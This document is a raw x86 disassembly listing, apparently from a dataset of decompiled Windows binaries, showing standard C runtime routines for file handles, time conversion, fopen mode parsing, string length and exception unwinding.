mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
imul ecx ecx 0x28
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_414b36
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x28
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x28
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x500
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_411ef3
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_414ccb
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_412928
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
mov eax esi
sub eax [ edi * 4 + rw-data ]
cdq
push 0x28
pop ecx
idiv ecx
mov ecx edi
shl ecx 0x5
add eax ecx
mov [ ebp - 0x1c ] eax
sub_414d97
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0x8 ]
add ecx 0xfffff894
push esi
xor esi esi
cmp ecx 0x46
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] ecx
jl r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
or edx 0xffffffff
jmp r-xdata
cmp ecx 0x44c
jle r-xdata
pop esi
leave
retn
push ebx
mov ebx [ ebp + 0xc ]
lea eax [ ebx - 0x1 ]
cmp eax 0xb
ja r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
or edx 0xffffffff
jmp r-xdata
cmp [ ebp + 0x14 ] 0x17
ja r-xdata
pop ebx
cmp [ ebp + 0x18 ] 0x3b
ja r-xdata
cmp [ ebp + 0x1c ] 0x3b
jbe r-xdata
cmp [ ebp + 0x10 ] 0x1
push edi
jl r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
or edx 0xffffffff
jmp r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edi [ eax - 0x4 ]
mov eax [ eax ]
sub eax edi
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
mov eax [ ebp + 0x10 ]
add edi eax
mov eax ecx
and eax 0x80000003
mov [ ebp + 0x8 ] edi
jns r-xdata
mov eax ecx
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ ecx + 0x76c ]
cdq
mov edi 0x190
idiv edi
test edx edx
jne r-xdata
mov eax ecx
push 0x64
cdq
pop edi
idiv edi
test edx edx
jne r-xdata
lea eax [ ecx + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
jne r-xdata
mov eax ecx
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push esi
push 0x16d
sub ebx eax
lea eax [ ecx - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
mov ebx edx
mov eax ecx
cdq
sub eax 0x46
sbb edx esi
push edx
push eax
call sub_415030
add edi eax
mov eax [ ebp + 0x8 ]
adc ebx edx
cdq
push esi
add edi eax
push 0x18
adc ebx edx
push ebx
push edi
call sub_415030
mov ecx eax
mov eax [ ebp + 0x14 ]
mov edi edx
cdq
push esi
add ecx eax
push 0x3c
adc edi edx
push edi
push ecx
call sub_415030
mov ecx eax
mov eax [ ebp + 0x18 ]
mov edi edx
cdq
push esi
add ecx eax
push 0x3c
adc edi edx
push edi
push ecx
call sub_415030
mov edi eax
mov eax [ ebp + 0x1c ]
mov ebx edx
cdq
add edi eax
adc ebx edx
call sub_41a92d
lea eax [ ebp - 0x8 ]
push eax
call sub_41a9bd
test eax eax
pop ecx
je r-xdata
cmp ebx 0x2
jle r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41a9f1
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
inc [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x1d
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_41aa25
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
mov eax [ ebp - 0x4 ]
cdq
add edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
adc ebx edx
dec eax
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x34 ] eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
mov eax [ ebp - 0xc ]
cdq
add edi eax
adc ebx edx
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
mov eax edi
mov edx ebx
cmp [ ebp - 0x8 ] esi
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_41a97c
test eax eax
pop ecx
je r-xdata
sub_415030
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_415064
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_414ac5
cmp eax 0xffffffff
pop ecx
jne r-xdata
push edi
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_412089
mov [ eax ] 0x9
or eax 0xffffffff
pop esi
retn
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_4120af
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_4150d6
push 0x10
push r--data
call sub_412340
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_412385
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415064
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4151a8
mov eax [ ebp - 0x1c ]
sub_4151b2
inc [ rw-data ]
push 0x1000
call sub_413757
test eax eax
pop ecx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_4151f6
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_414ac5
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
mov eax [ rw-data ]
jne r-xdata
xor eax eax
push edi
call sub_4120af
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x54 ] 0x1
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_414ac5
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x2c ] 0x1
je r-xdata
push 0x2
call sub_414ac5
push 0x1
mov edi eax
call sub_414ac5
cmp eax edi
pop ecx
pop ecx
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_414a44
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
test edi edi
mov eax [ eax * 4 + rw-data ]
pop ecx
mov [ eax + esi + 0x4 ] 0x0
je r-xdata
sub_41528a
push 0x10
push r--data
call sub_412340
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_412385
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_4151f6
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41534d
mov eax [ ebp - 0x1c ]
sub_415357
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40fdab
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_415383
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_414ac5
or edi 0xffffffff
cmp eax edi
pop ecx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
call sub_412089
mov [ eax ] 0x9
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_4120af
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_415406
push 0x14
push r--data
call sub_412340
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_412385
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415383
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415515
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_41551f
push 0x10
push r--data
call sub_412340
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_412089
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_412385
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ edi ]
movzx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_414ac5
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4155f6
mov eax [ ebp - 0x1c ]
call sub_41209c
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_415600
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
je r-xdata
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_412089
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
sub_415665
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x80
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
cmp al bl
push edi
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_41b17b
add esp 0x14
test eax eax
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x4
push esi
push r--data
call sub_41b52f
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x4
push r--data
push esi
call sub_41b3b3
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
push r--data
push esi
call sub_41b3b3
test eax eax
pop ecx
pop ecx
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
push r--data
push esi
call sub_41b3b3
test eax eax
pop ecx
pop ecx
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_415907
push 0x10
push r--data
call sub_412340
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415a24
mov eax edi
call sub_412385
retn
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_413757
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_412928
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
push [ esi + eax ]
call sub_40fdab
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40e5bd
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_411e30
pop ecx
test eax eax
je r-xdata
mov edi eax
jmp r-xdata
push eax
push esi
call sub_40e60f
pop ecx
pop ecx
mov [ ebp - 0x1c ] edi
sub_415a30
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_415ac0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_41b65d
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_41b67c
jmp r-xdata
sub_415ac0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_413965
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_415a30
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_415b22
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_415b52
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_415b90
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_415c1b
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_41945e
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_411648
test eax eax
movsx eax [ esi ]
push eax
call sub_41945e
cmp eax 0x78
pop ecx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
cmp [ ebp - 0x4 ] cl
pop esi
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_415c8c
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
test cl cl
mov esi [ ebp - 0x10 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_415d22
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_41b9b3
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_41b90d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_415d79
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_415b90
inc eax
push eax
push esi
add esi edi
push esi
call sub_41ba60
add esp 0x10
sub_415db2
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_410556
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_412089
push 0x16
cmp [ ebp + 0xc ] esi
